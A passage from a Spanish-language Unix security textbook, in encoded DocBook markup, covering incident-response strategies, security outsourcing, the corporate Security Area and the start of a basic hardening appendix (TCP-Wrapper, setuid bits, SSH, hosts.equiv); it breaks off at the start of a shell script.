Seguramente ser&#x00E1; necesario interferir de forma activa las acciones del intruso para evitar m&#x00E1;s
accesos, y analizar el da~no causado. La principal desventaja de esta estrategia es que el atacante
se da cuenta r&#x00E1;pidamente de que ha sido descubierto, y puede emprender acciones para ser
identi&#xFB01;cado, lo que incluso conduce al borrado de logs o de sistemas de &#xFB01;cheros completos;
incluso puede cambiar su estrategia de ataque a un nuevo m&#x00E9;todo, y seguir comprometiendo al
sistema. Sin embargo, esta estrategia tambi&#x00E9;n presenta una parte positiva: el bajo nivel de
conocimientos de los atacantes en sistemas habituales hace que en muchas ocasiones se limiten a
abandonar su ataque y dedicarse a probar suerte con otros sistemas menos protegidos en otras
organizaciones.
<!--br/-->
<!--br/-->La segunda estrategia de respuesta, perseguir y procesar, adopta la &#xFB01;losof&#x02CA;&#x0131;a de permitir al atacante
proseguir sus actividades, pero de forma controlada y observada por los administradores, de la forma m&#x00E1;s
discreta posible. Con esto, se intentan guardar pruebas para ser utilizadas en la segunda parte de
la estrategia, la de acusaci&#x00F3;n y procesamiento del atacante (ya sea ante la justicia o ante los
responsables de la organizaci&#x00F3;n, si se trata de usuarios internos). Evidentemente corremos el
peligro de que el intruso descubra su monitorizaci&#x00F3;n y destruya completamente el sistema,
as&#x02CA;&#x0131; como que nuestros resultados no se tengan en cuenta ante un tribunal debido a las artima~nas
legales que algunos abogados aprovechan; la parte positiva de esta estrategia es, aparte de la
recolecci&#x00F3;n de pruebas, que permite a los responsables conocer las actividades del atacante, qu&#x00E9;
vulnerabilidades de nuestra organizaci&#x00F3;n ha aprovechado para atacarla, c&#x00F3;mo se comporta una vez dentro,

etc. De esta forma podemos aprovechar el ataque para reforzar los puntos d&#x00E9;biles de nuestros
sistemas.
<!--br/-->
<!--br/-->A nadie se le escapan los enormes peligros que entra~na el permitir a un atacante proseguir con sus
actividades dentro de las m&#x00E1;quinas; por muy controladas que est&#x00E9;n, en cualquier momento casi nada puede
evitar que la persona se sienta vigilada, se ponga nerviosa y destruya completamente nuestros datos. Una
forma de monitorizar sus actividades sin comprometer excesivamente nuestra integridad es mediante un
proceso denominado jailing o encarcelamiento: la idea es construir un sistema que simule al real, pero
donde no se encuentren datos importantes, y que permita observar al atacante sin poner en peligro los
sistemas reales. Para ello se utiliza una m&#x00E1;quina, denominada sistema de sacri&#xFB01;cio, que es donde el
atacante realmente trabaja, y un segundo sistema, denominado de observaci&#x00F3;n, conectado al
anterior y que permite analizar todo lo que esa persona est&#x00E1; llevando a cabo. De esta forma
conseguimos que el atacante piense que su intrusi&#x00F3;n ha tenido &#x00E9;xito y continue con ella mientras lo
monitorizamos y recopilamos pruebas para presentar en una posible demanda o acusaci&#x00F3;n. Si
deseamos construir una c&#x00E1;rcel es necesario que dispongamos de unos conocimientos medios
o elevados de programaci&#x00F3;n de sistemas; utilidades como chroot() nos pueden ser de gran
ayuda, as&#x02CA;&#x0131; como software de simulaci&#x00F3;n como Deception Tookit (DTK), que simula el &#x00E9;xito de un
ataque ante el pirata que lo lanza, pero que realmente nos est&#x00E1; informa del intento de violaci&#x00F3;n
producido.
<!--br/-->
<!--br/-->Sin importar la estrategia adoptada ante un ataque, siempre es recomendable ponerse en contacto con
entidades externas a nuestra organizaci&#x00F3;n, incluyendo por ejemplo fuerzas de seguridad (en
Espa~na, Guardia Civil o Polic&#x02CA;&#x0131;a Nacional), gabinetes jur&#x02CA;&#x0131;dicos o equipos de expertos en seguridad
inform&#x00E1;tica, como el CERT. En el caso de instituciones de I+D, en Espa~na existe IrisCERT
(http://www.rediris.es/cert/), el equipo de respuesta ante emergencias de seguridad de RedIRIS, la
red universitaria espa~nola.
  </para></section><!--end section--><!--l. 532--><section 
role="section"><title><abbrev role="title-mark">22.5</abbrev><anchor 
   id="x1-33900022.5"  ></anchor>Outsourcing</title>
<!--l. 533--><para>  Cada vez es m&#x00E1;s habitual que las empresas contraten los servicios de seguridad de una compa~n&#x02CA;&#x0131;a externa,
especializada en la materia, y que permita olvidarse &#x2013; relativamente, como veremos despu&#x00E9;s &#x2013; al
personal de esa empresa de los aspectos t&#x00E9;cnicos y organizativos de la seguridad, para poder
centrarse as&#x02CA;&#x0131; en su l&#x02CA;&#x0131;nea de negocio correspondiente; esta pol&#x02CA;&#x0131;tica es lo que se conoce como
outsourcing y se intenta traducir por &#x2018;externalizaci&#x00F3;n&#x2019;, aplicado en nuestro caso a la seguridad
corporativa. A los que somos puramente t&#x00E9;cnicos muchas veces se nos olvida que la seguridad en
s&#x02CA;&#x0131; misma no es ning&#x00FA;n &#xFB01;n, sino una herramienta al servicio de los negocios, y por tanto nuestros
esfuerzos han de ir orientados a proteger el &#x2018;patrimonio&#x2019; (humano, tecnol&#x00F3;gico, econ&#x00F3;mico&#x2026;) de
quien contrata nuestros servicios: al director de una gran &#xFB01;rma probablemente le importe
muy poco que hayamos implantado en sus instalaciones el mejor cortafuegos del mercado
junto a un fabuloso sistema distribuido de detecci&#x00F3;n de intrusos si despu&#x00E9;s un atacante puede
entrar con toda facilidad en la sala de m&#x00E1;quinas y robar varias cintas de backup con toda la
informaci&#x00F3;n cr&#x02CA;&#x0131;tica de esa compa~n&#x02CA;&#x0131;a; y si esto sucede, simplemente hemos hecho mal nuestro
trabajo.
<!--br/-->
<!--br/-->&#x00BF;Por qu&#x00E9; va a querer una empresa determinada que personas ajenas a la misma gestionen su seguridad? Al
&#xFB01;n y al cabo, estamos hablando de la protecci&#x00F3;n de muchos activos de la compa~n&#x02CA;&#x0131;a, y encomendar esa tarea
tan cr&#x02CA;&#x0131;tica a un tercero, de quien en principio &#x2013; ni en &#xFB01;nal &#x2013; no tenemos porqu&#x00E9; con&#xFB01;ar, no parece a
primera vista una buena idea&#x2026;Existen diferentes motivos para llegar a externalizar nuestra seguridad; por
un lado, como hemos comentado, un outsourcing permite a la empresa que lo contrata despreocuparse
relativamente de su seguridad para centrarse en sus l&#x02CA;&#x0131;neas de negocio. Adem&#x00E1;s, al contratar a personal
especializado &#x2013; al menos en principio &#x2013; en la seguridad se consigue &#x2013; tambi&#x00E9;n en principio &#x2013; un nivel
mayor de protecci&#x00F3;n, tanto por el factor humano (el contratado ha de tener gente con un alto
nivel en diferentes materias de seguridad para poder ofrecer correctamente sus servicios) como
t&#x00E9;cnico (dispondr&#x00E1; tambi&#x00E9;n de productos y sistemas m&#x00E1;s espec&#x02CA;&#x0131;&#xFB01;cos, algo de lo que probablemente
el contratante no puede disponer tan f&#x00E1;cilmente). Te&#x00F3;ricamente, estamos reduciendo riesgos a
la vez que reducimos costes, por lo que parece que nos encontramos ante la panacea de la

seguridad.
<!--br/-->
<!--br/-->Desgraciadamente, el mundo real no es tan bonito como lo se puede escribir sobre un papel; el outsourcing
presenta a priori graves inconvenientes, y quiz&#x00E1;s el m&#x00E1;s importante sea el que ya hemos adelantado: dejar
toda nuestra seguridad en manos de desconocidos, por muy buenas referencias que podamos tener de ellos.
Muchas empresas dedicadas a ofrecer servicios de gesti&#x00F3;n externa de seguridad est&#x00E1;n formadas por ex-piratas
(&#x00A1;incluso existen algunas de ellas que se jactan de esto!), lo cual no deja de ser contradictorio:
estamos dejando al cuidado de nuestro reba~no a lobos, o cuanto menos ex-lobos, algo que
plantea, o debe plantear, ciertas cuestiones &#x00E9;ticas. No voy a expresar de nuevo mi punto de vista
(que no deja de ser una mera opini&#x00F3;n) acerca de los piratas, porque creo que ya ha quedado
su&#xFB01;cientemente claro en diferentes puntos de este documento, as&#x02CA;&#x0131; que cada cual act&#x00FA;e como su
conciencia o sus directivos le indiquen. Por supuesto, tampoco quiero meter a todo este tipo de
compa~n&#x02CA;&#x0131;as en un mismo saco, porque por l&#x00F3;gica habr&#x00E1; de todo, ni entrar ahora a discutir acerca de si
para saber defender un entorno hay que saber atacarlo, porque una cosa es saber atacar (algo
que se puede aprender en sistemas autorizados, o en nuestro propio laboratorio, sin afectar a
ning&#x00FA;n tercero) y otra defender que s&#x00F3;lo un antiguo pirata es capaz de proteger correctamente un
sistema.
<!--br/-->
<!--br/-->Aparte de este &#x2018;ligero&#x2019; inconveniente del outsourcing, tenemos otros tipos de problemas a tener tambi&#x00E9;n en
cuenta; uno de ellos es justamente el l&#x02CA;&#x0131;mite de uno de los bene&#xFB01;cios de esta pol&#x02CA;&#x0131;tica: ya que la
externalizaci&#x00F3;n permite a una empresa &#x2018;despreocuparse&#x2019; de su seguridad, podemos encontrar el caso &#x2013; nada
extra~no &#x2013; de un excesivo &#x2018;despreocupamiento&#x2019;. Actualmente, el abanico de servicios que ofrece cualquier
consultora de seguridad suele abarcar desde auditor&#x02CA;&#x0131;as puntuales hasta una delegaci&#x00F3;n total del servicio
pasando por todo tipo de soluciones intermedias, y lo que justi&#xFB01;ca la elecci&#x00F3;n de un modelo u otro es un
simple an&#x00E1;lisis de riesgos: el riesgo de la soluci&#x00F3;n externalizada ha de ser menor que el nivel de riesgo
existente si se gestiona la seguridad de forma interna. En cualquier caso, al externalizar se suele
introducir una cierta p&#x00E9;rdida de control directo sobre algunos recursos de la compa~n&#x02CA;&#x0131;a, y cuando
esa p&#x00E9;rdida supera un umbral nos encontramos ante un grave problema; en ning&#x00FA;n caso es
recomendable un desentendimiento total de los servicios externalizados, y el contacto e intercambio de
informaci&#x00F3;n entre las dos organizaciones (la contratante y la contratada) han de ser cont&#x02CA;&#x0131;nuos y
&#xFB02;uidos.
<!--br/-->
<!--br/-->Cuanto m&#x00E1;s alejada de las nuevas tecnolog&#x02CA;&#x0131;as se encuentre la l&#x02CA;&#x0131;nea de negocio de una determinada empresa,
m&#x00E1;s recomendable suele ser para la misma adoptar una soluci&#x00F3;n de outsourcing (<citation>[?]</citation>); esto es evidente: una
empresa frutera, independientemente de lo grande o peque~na que sea, pero perteneciente a un &#x00E1;rea no
relacionada con nuevas tecnolog&#x02CA;&#x0131;as, rara vez va a disponer de los mismos recursos humanos y t&#x00E9;cnicos para
destinar exclusivamente a seguridad que una empresa de telecomunicaciones o inform&#x00E1;tica. Es habitual &#x2013; y
as&#x02CA;&#x0131; debe ser &#x2013; que el nivel de externalizaci&#x00F3;n sea mayor conforme la empresa contratante se
aleje del mundo de las nuevas tecnolog&#x02CA;&#x0131;as, contemplando un amplio abanico que abarca desde
la gesti&#x00F3;n de elementos concretos de protecci&#x00F3;n (como un &#xFB01;rewall corporativo) o auditor&#x02CA;&#x0131;as y
tests de penetraci&#x00F3;n puntuales hasta soluciones de externalizaci&#x00F3;n total; en cualquier caso, es
necesario insistir de nuevo en el error de &#x2018;despreocuparse&#x2019; demasiado de la gesti&#x00F3;n de nuestra
seguridad: incluso a esa empresa frutera que acabamos de comentar le interesar&#x00E1;, o al menos
as&#x02CA;&#x0131; deber&#x02CA;&#x0131;a ser, recibir como poco un informe mensual donde en unas pocas hojas, y sin entrar en
aspectos demasiado t&#x00E9;cnicos, se le mantenga al d&#x02CA;&#x0131;a de cualquier aspecto relevante que afecte a su
seguridad.
<!--br/-->
<!--br/-->&#x00BF;Qu&#x00E9; areas de nuestra seguridad conviene externalizar? Evidentemente, no existe una respuesta universal a
esta pregunta. Existen &#x00E1;reas que por su delicadez o criticidad no conviene casi nunca dejar en manos de
terceros, como es el caso de la realizaci&#x00F3;n y veri&#xFB01;caci&#x00F3;n de backups: todos hemos escuchado historias
graciosas &#x2013; o terribles, seg&#x00FA;n en que lado estemos &#x2013; relacionadas con errores en las copias de seguridad,
como ejecutar la simulaci&#x00F3;n de copia en lugar de una copia real para &#xFB01;nalizar m&#x00E1;s r&#x00E1;pidamente el proceso de
backup. No obstante, elementos importantes pero no cr&#x02CA;&#x0131;ticos a priori, como los tests de penetraci&#x00F3;n, de
visibilidad o las auditor&#x02CA;&#x0131;as de vulnerabilidades, que habitualmente se suelen externalizar, ya que incluso
existen empresas de seguridad especializadas en este tipo de acciones. Otro ejemplo de &#x00E1;rea a
externalizar puede ser la gesti&#x00F3;n de los cortafuegos corporativos, trabajo que en demasiadas ocasiones
recae sobre el &#x00E1;rea de Seguridad propia y que como veremos en el pr&#x00F3;ximo punto no deber&#x02CA;&#x0131;a ser

as&#x02CA;&#x0131;. En de&#xFB01;nitiva, no podemos dar un listado donde se indiquen por orden las prioridades
de externalizaci&#x00F3;n, ya que es algo que depende completamente de cada compa~n&#x02CA;&#x0131;a y entorno;
ha de ser el personal de la propia compa~n&#x02CA;&#x0131;a, asesorado por consultores de seguridad y por
abogados (recordemos que la LOPD est&#x00E1; ah&#x02CA;&#x0131;), quien decida qu&#x00E9; y de qu&#x00E9; forma gestionar en
outsourcing.
  </para></section><!--end section--><!--l. 644--><section 
role="section"><title><abbrev role="title-mark">22.6</abbrev><anchor 
   id="x1-34000022.6"  ></anchor>El &#x2018;&#x00C1;rea de Seguridad&#x2019;</title>
<!--l. 645--><para>  Casi cualquier mediana o peque~na empresa posee actualmente lo que se viene a llamar el &#x2018;&#x00C1;rea de
Seguridad&#x2019;, formada pocas veces a partir de gente que haya sido incorporada a la plantilla a tal efecto, y
muchas a partir del reciclaje de personal de otras &#x00E1;reas de la corporaci&#x00F3;n, t&#x02CA;&#x0131;picamente las de Sistemas o
Comunicaciones. En este punto vamos a hablar brevemente de este &#x00E1;rea y su posici&#x00F3;n corporativa, haciendo
referencia tanto a sus funciones te&#x00F3;ricas como a sus problemas de de&#xFB01;nici&#x00F3;n dentro del organigrama de la
organizaci&#x00F3;n.
<!--br/-->
<!--br/-->&#x00BF;Cu&#x00E1;l es la funci&#x00F3;n de este &#x00E1;rea? Realmente, mientras que todo el personal sabe cual es el cometido de la
gente de Desarrollo, Sistemas o Bases de Datos, el del &#x00E1;rea de Seguridad no suele estar de&#xFB01;nido
de una forma clara: al tratarse en muchos casos, como acabamos de comentar, de personal
&#x2018;reciclado&#x2019; de otras &#x00E1;reas, se trabaja mucho en aspectos de seguridad &#x2013; para eso se suele crear,
evidentemente &#x2013;, pero tambi&#x00E9;n se acaba realizando funciones que corresponden a otras &#x00E1;reas;
esto es especialmente preocupante con respecto a Sistemas, ya que en muchas ocasiones el
personal de Seguridad trabaja &#x2018;demasiado cerca&#x2019; de esta otra &#x00E1;rea, llegando a realizar tareas
puramente relacionadas con Sistemas, como la gesti&#x00F3;n de los cortafuegos (no nos referimos a la
de&#xFB01;nici&#x00F3;n de pol&#x02CA;&#x0131;ticas ni nada parecido, sino &#x00FA;nicamente al manejo del mismo). Y si a esto le
a~nadimos que a muchos de los que nos dedicamos a este mundo nos gusta tambi&#x00E9;n todo lo
relacionado con sistemas &#x2013; sobre todo si son Unix :-) &#x2013;, pues llegamos a una situaci&#x00F3;n en la
que nadie pone pegas a hacer un trabajo que no le corresponde, con lo cual se vicia el &#x00E1;rea de
Seguridad centr&#x00E1;ndose &#x00FA;nicamente en aspectos t&#x00E9;cnicos pero descuidando otros que son igual o m&#x00E1;s
importantes. Por si esto fuera poco, existe una serie de funciones en con&#xFB02;icto a la hora de
gestionar la seguridad corporativa, t&#x02CA;&#x0131;picamente la del administrador de seguridad frente a la del
administrador de sistemas, de bases de datos, o incluso frente al operador de sistemas y los
desarrolladores.
<!--br/-->
<!--br/-->Te&#x00F3;ricamente, el &#x00E1;rea de Seguridad ha de estar correctamente de&#xFB01;nida y ser independiente de cualquier otra
de la compa~n&#x02CA;&#x0131;a, y por supuesto de la direcci&#x00F3;n de la misma: aunque en la pr&#x00E1;ctica sea casi imposible
conseguirlo, no podemos de&#xFB01;nir una pol&#x02CA;&#x0131;tica de obligado cumplimiento para todos los trabajadores
excepto para nuestros jefes. Evidentemente, ha de contar con el apoyo total de la direcci&#x00F3;n de la
entidad, que debe estudiar, aprobar y respaldar permanentemente, y de forma anticipada, las
decisiones de seguridad que el &#x00E1;rea decida llevar a cabo (siempre dentro de unos l&#x02CA;&#x0131;mites, est&#x00E1;
claro&#x2026;).
<!--br/-->
<!--br/-->El trabajo del &#x00E1;rea debe ser m&#x00E1;s normativo que t&#x00E9;cnico: no podemos dedicar al personal de la misma a
cambiar contrase~nas de usuarios o a gestionar (entendido por &#x2018;manejar&#x2019;) los cortafuegos corporativos, sino
que el &#x00E1;rea de Seguridad debe de&#xFB01;nir pol&#x02CA;&#x0131;ticas e implantar mecanismos que obliguen a su cumplimiento, o
cuanto menos que avisen a quien corresponda en caso de que una norma no se cumpla. T&#x00E9;cnicamente esto
no es siempre posible, ya que ni todos los sistemas ni todas las aplicaciones utilizadas tienen porqu&#x00E9; ofrecer
mecanismos que nos ayuden en nuestra seguridad, pero cuando lo sea es funci&#x00F3;n del &#x00E1;rea bien su implantaci&#x00F3;n
o bien su auditor&#x02CA;&#x0131;a (si es implantado por otro &#x00E1;rea). Si una determinada aplicaci&#x00F3;n no soporta las
exigencias de&#xFB01;nidas en la pol&#x02CA;&#x0131;tica de seguridad, pero a&#x00FA;n as&#x02CA;&#x0131; es imprescindible su uso, el &#x00E1;rea de
Seguridad debe recordar que el cumplimiento de la normativa es igualmente obligatorio; al oir
esto, mucha gente puede poner el grito en el cielo: en realidad, si el programa no cumple las
especi&#xFB01;caciones del &#x00E1;rea de Seguridad, lo l&#x00F3;gico ser&#x02CA;&#x0131;a prohibir su uso, pero funcionalmente esto
no es siempre (realmente, casi nunca) posible: no tenemos m&#x00E1;s que pensar en una aplicaci&#x00F3;n
corporativa que venga gestionando desde hace a~nos las incidencias de la organizaci&#x00F3;n, y que
evidentemente la direcci&#x00F3;n no va a sustituir por otra &#x2018;s&#x00F3;lo&#x2019; por que el &#x00E1;rea de Seguridad lo indique.
Si nuestra pol&#x02CA;&#x0131;tica marca que la longitud de clave m&#x02CA;&#x0131;nima es de seis caracteres, pero esta

aplicaci&#x00F3;n &#x2013; recordemos, vital para el buen funcionamiento de la organizaci&#x00F3;n &#x2013; acepta contrase~nas
de cuatro, el usuario no debe poner estas claves tan cortas por mucho que la aplicaci&#x00F3;n las
acepte; si lo hace est&#x00E1; violando la pol&#x02CA;&#x0131;tica de seguridad de&#xFB01;nida, y el hecho de que el programa
le deje hacerlo no es ninguna excusa. La pol&#x02CA;&#x0131;tica es en este sentido algo similar al c&#x00F3;digo de
circulaci&#x00F3;n: no debemos sobrepasar los l&#x02CA;&#x0131;mites de velocidad, aunque las caracter&#x02CA;&#x0131;ticas mec&#x00E1;nicas de
nuestro coche nos permitan hacerlo y aunque no siempre tengamos un policia detr&#x00E1;s que nos est&#x00E9;
vigilando.
<!--br/-->
<!--br/-->Aparte de la de&#xFB01;nici&#x00F3;n de pol&#x02CA;&#x0131;ticas y la implantaci&#x00F3;n (o al menos la auditor&#x02CA;&#x0131;a) de mecanismos, es tarea del
&#x00E1;rea de Seguridad la realizaci&#x00F3;n de an&#x00E1;lisis de riesgos; aunque el primero sea con diferencia el m&#x00E1;s costoso, una
vez hecho este el resto no suele implicar mucha di&#xFB01;cultad. Por supuesto, todo esto ha de ser
cont&#x02CA;&#x0131;nuo en el tiempo &#x2013; para entender porqu&#x00E9;, no tenemos m&#x00E1;s que &#xFB01;jarnos en lo r&#x00E1;pido que cambia
cualquier aspecto relacionado con las nuevas tecnolog&#x02CA;&#x0131;as &#x2013; y permanente realimentado, de forma
que la pol&#x02CA;&#x0131;tica de seguridad puede modi&#xFB01;car el an&#x00E1;lisis de riesgos y viceversa. Asociados a los
riesgos se de&#xFB01;nen planes de contingencia para recuperar el servicio en caso de que se materialice
un problema determinado; esta documentaci&#x00F3;n ha de ser perfectamente conocida por todo el
personal al que involucra, y debe contemplar desde los riesgos m&#x00E1;s bajos hasta los de nivel m&#x00E1;s
elevado o incluso las cat&#x00E1;strofes: &#x00BF;qu&#x00E9; pasar&#x02CA;&#x0131;a si ma~nana nuestro CPD se incendia o el edi&#xFB01;cio se
derrumba?, &#x00BF;cu&#x00E1;nto tardar&#x02CA;&#x0131;amos en recuperar el servicio?, &#x00BF;sabr&#x02CA;&#x0131;a cada persona qu&#x00E9; hacer en este
caso?&#x2026;



</para><!--l. 1--><para>

</para><!--l. 1--><para>

</para><!--l. 1--><para>

  </para></section><!--end section--><!--l. 1--><section 
role="part"><title><anchor 
   id="x1-341000VI"  ></anchor>Ap&#x00E9;ndices</title>

<!--l. 132--><para>


</para><!--l. 16--><para>

<anchor 
   id="x1-341001r363"  ></anchor>
</para><!--l. 16--><para>  <anchor 
   id="x1-342000A"  ></anchor>Seguridad b&#x00E1;sica para administradores
  </para><!--l. 17--><section 
role="section"><title><abbrev role="title-mark">A.1</abbrev><anchor 
   id="x1-343000A.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 18--><para>  Lamentablemente, muchos administradores de equipos Unix no disponen de los conocimientos, del
tiempo, o simplemente del inter&#x00E9;s necesario para conseguir sistemas m&#x02CA;&#x0131;nimamente &#xFB01;ables. A ra&#x02CA;&#x0131;z de esto,
las m&#x00E1;quinas Unix se convierten en una puerta abierta a cualquier ataque, poniendo en peligro no s&#x00F3;lo la
integridad del equipo, sino de toda su subred y a la larga de toda Internet.
<!--br/-->
<!--br/-->Aunque esta situaci&#x00F3;n se da en cualquier tipo de organizaci&#x00F3;n, es en las dedicadas a I+D donde se
encuentran los casos m&#x00E1;s extremos; se trata de redes y equipos Unix muy abiertos y con un
elevado n&#x00FA;mero de usuarios (incluidos externos al per&#x02CA;&#x0131;metro f&#x02CA;&#x0131;sico de la organizaci&#x00F3;n) que precisan
de una gran disponibilidad de los datos, primando este aspecto de la informaci&#x00F3;n ante otros
como la integridad o la privacidad. Esto convierte a los sistemas Unix de centros de I+D,
especialmente de universidades, en un objetivo demasiado f&#x00E1;cil incluso para los piratas menos
experimentados.
<!--br/-->
<!--br/-->Con el objetivo de subsanar esta situaci&#x00F3;n, aqu&#x02CA;&#x0131; se van a intentar marcar unas pautas para conseguir un
nivel m&#x02CA;&#x0131;nimo de &#xFB01;abilidad en los equipos Unix. No se va a entrar en detalles muy t&#x00E9;cnicos o en desarrollos
te&#x00F3;ricos sobre seguridad que muy pocos van a leer (para eso est&#x00E1; el resto de este proyecto), sino que
la idea es &#x00FA;nicamente explicar los pasos b&#x00E1;sicos para que incluso los administradores menos
preocupados por la seguridad puedan aplicarlos en sus sistemas. A modo de ilustraci&#x00F3;n, hay peque~nos
ejemplos que han sido realizados sobre una plataforma Solaris 7 (SunOS 5.7); en otros clones de
Unix quiz&#x00E1;s sea necesario modi&#xFB01;car las opciones de alg&#x00FA;n comando o la localizaci&#x00F3;n de ciertos
&#xFB01;cheros.
<!--br/-->
<!--br/-->Hay que recalcar que se trata de mecanismos b&#x00E1;sicos de seguridad, que pueden evitar la acci&#x00F3;n de algunos
piratas casuales (si nuestra m&#x00E1;quina ofrece una m&#x02CA;&#x0131;nima protecci&#x00F3;n abandonar&#x00E1;n el ataque para dedicarse a
equipos menos protegidos) pero no de un atacante con cierta experiencia. Lo ideal ser&#x02CA;&#x0131;a que las pautas
marcadas aqu&#x02CA;&#x0131; se complementaran con todas las medidas de seguridad posibles, y que entre los libros
habituales de un administrador se encontraran t&#x02CA;&#x0131;tulos sobre seguridad en Unix; uno especialmente
recomendado es Practical Unix &#x0026; Internet Security, de Simson Gar&#xFB01;nkel y Gene Spa&#xFB00;ord (Ed.
O&#x02CA;
</para><!--l. 178--><para>  SunOS 5.7
</para><!--l. 180--><para>  login:
Sin embargo, con&#xFB01;gurando TCP-Wrapper para que no admita conexiones desde fuera de la universidad, si
alguien intenta lo mismo obtendr&#x00E1; un resultado similar al siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~$&#x00A0;telnet&#x00A0;anita
&#x00A0;Trying&#x00A0;192.168.0.3...
&#x00A0;Connected&#x00A0;to&#x00A0;anita.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;Connection&#x00A0;closed&#x00A0;by&#x00A0;foreign&#x00A0;host.
&#x00A0;luisa:~$
</literallayout>
<!--l. 199--><para>De esta forma, incluso si el atacante conociera un nombre de usuario y su clave le ser&#x02CA;&#x0131;a m&#x00E1;s dif&#x02CA;&#x0131;cil acceder a
nuestro equipo por telnet.
Ficheros setuidados y setgidados
<!--br/-->En un sistema Unix reci&#x00E9;n instalado podemos tener incluso m&#x00E1;s de cincuenta &#xFB01;cheros con los modos setuid o
setgid activados; cualquiera de estos programas representa un potencial agujero a la seguridad
de nuestro sistema, y aunque muchos son necesarios (como /bin/passwd en la mayor&#x02CA;&#x0131;a de
situaciones), de otros se puede prescindir. Para localizar los &#xFB01;cheros setuidados podemos utilizar la
orden

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;find&#x00A0;/&#x00A0;-perm&#x00A0;-4000&#x00A0;-type&#x00A0;f&#x00A0;-print
</literallayout>
<!--l. 215--><para>mientras que para localizar los setgidados podemos utilizar

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;find&#x00A0;/&#x00A0;-perm&#x00A0;-2000&#x00A0;-type&#x00A0;f&#x00A0;-print
</literallayout>
<!--l. 223--><para>Es conveniente que reduzcamos al m&#x02CA;&#x0131;nimo el n&#x00FA;mero de estos archivos, pero tampoco se recomienda borrarlos
del sistema de &#xFB01;cheros; es mucho m&#x00E1;s habitual resetear el bit de setuid o setgid, y en caso de que sea
necesario volverlo a activar. Para desactivar estos bits podemos usar la orden chmod -s, mientras que para
activarlos utilizaremos chmod u+s o chmod g+s.
<!--br/-->Por ejemplo, si el &#xFB01;chero /usr/lib/fs/ufs/ufsdump est&#x00E1; setuidado, un listado largo del mismo nos
mostrar&#x00E1; una s en el campo de ejecuci&#x00F3;n para propietario, mientras que si est&#x00E1; setgidado aparecer&#x00E1;
una s en el campo de ejecuci&#x00F3;n para grupo; podemos resetear los dos bits con la orden vista
anteriormente:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;ls&#x00A0;-l&#x00A0;/usr/lib/fs/ufs/ufsdump
&#x00A0;-r-sr-sr-x&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;tty&#x00A0;&#x00A0;&#x00A0;144608&#x00A0;Oct&#x00A0;6&#x00A0;1998&#x00A0;/usr/lib/fs/ufs/ufsdump
&#x00A0;anita:/#&#x00A0;chmod&#x00A0;-s&#x00A0;/usr/lib/fs/ufs/ufsdump
&#x00A0;anita:/#&#x00A0;ls&#x00A0;-l&#x00A0;/usr/lib/fs/ufs/ufsdump
&#x00A0;-r-xr-xr-x&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;tty&#x00A0;&#x00A0;&#x00A0;144608&#x00A0;Oct&#x00A0;6&#x00A0;1998&#x00A0;/usr/lib/fs/ufs/ufsdump
</literallayout>
Cifrado de datos
<!--br/-->El principal problema de las claves viajando en texto claro por la red es que cualquier atacante puede
leerlas: si usamos telnet, rlogin o ftp, cualquier persona situada entre nuestra estaci&#x00F3;n de trabajo y el
servidor al que conectamos puede &#x2018;esnifar&#x2019; los paquetes que circulan por la red y obtener as&#x02CA;&#x0131; nuestro
nombre de usuario y nuestro password. Para evitar este problema es conveniente utilizar software que
implemente protocolos cifrados para conectar; el m&#x00E1;s habitual hoy en d&#x02CA;&#x0131;a es SSH (Secure Shell).
Por una parte, tenemos el programa servidor sshd, que se ha de instalar en el equipo al que
conectamos, y por otra programas clientes (ssh para sustituir a rsh/rlogin y scp para sustituir a
rcp).
<!--br/-->Una vez instalado, este software es transparente al usuario: simplemente ha de recordar su clave, igual que
si conectara por telnet o rlogin.
Relaciones de con&#xFB01;anza
<!--br/-->En el &#xFB01;chero /etc/hosts.equiv se indican, una en cada l&#x02CA;&#x0131;nea, las m&#x00E1;quinas con&#xFB01;ables. &#x00BF;Qu&#x00E9; signi&#xFB01;ca
con&#xFB01;ables? B&#x00E1;sicamente que con&#xFB01;amos en su seguridad tanto como en la nuestra, por lo que para facilitar la
compartici&#x00F3;n de recursos, no se van a pedir contrase~nas a los usuarios que quieran conectar desde estas
m&#x00E1;quinas con el mismo login, utilizando las &#x00F3;rdenes BSD r<informalequation><graphic 
fileref="unixsec548x.gif"></graphic></informalequation> (rlogin, rsh, rcp&#x2026;). Por ejemplo, si en el
&#xFB01;chero /etc/hosts.equiv del servidor anita hay una entrada para el nombre de host luisa, cualquier
usuario <anchor 
   id="x1-343001f1"  ></anchor><footnote><para>     Excepto el root.</para></footnote>
de este sistema puede ejecutar una orden como la siguiente para conectar a anita &#x00A1;sin necesidad de
ninguna clave!:

     <literallayout role="verbatim">
&#x00A0;luisa:~$&#x00A0;rlogin&#x00A0;anita
&#x00A0;Last&#x00A0;login:&#x00A0;Sun&#x00A0;Oct&#x00A0;31&#x00A0;08:27:54&#x00A0;from&#x00A0;localhost
&#x00A0;Sun&#x00A0;Microsystems&#x00A0;Inc.&#x00A0;&#x00A0;&#x00A0;SunOS&#x00A0;5.7&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Generic&#x00A0;October&#x00A0;1998
&#x00A0;anita:~$
</literallayout>
<!--l. 282--><para>Obviamente, esto supone un gran problema de seguridad, por lo que lo m&#x00E1;s recomendable es que el &#xFB01;chero
/etc/hosts.equiv est&#x00E9; vac&#x02CA;&#x0131;o o no exista. De la misma forma, los usuarios pueden crear &#xFB01;cheros
$HOME/.rhosts para establecer un mecanismo de con&#xFB01;abilidad bastante similar al de /etc/hosts.equiv;
es importante para la seguridad de nuestro sistema el controlar la existencia y el contenido de estos
archivos .rhosts. Por ejemplo, podemos aprovechar las facilidades de plani&#xFB01;caci&#x00F3;n de tareas
de Unix para, cada cierto tiempo, chequear los directorios $HOME de los usuarios en busca
de estos &#xFB01;cheros, elimin&#x00E1;ndolos si los encontramos. Un shellscript que hace esto puede ser el
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;#!/bin/sh
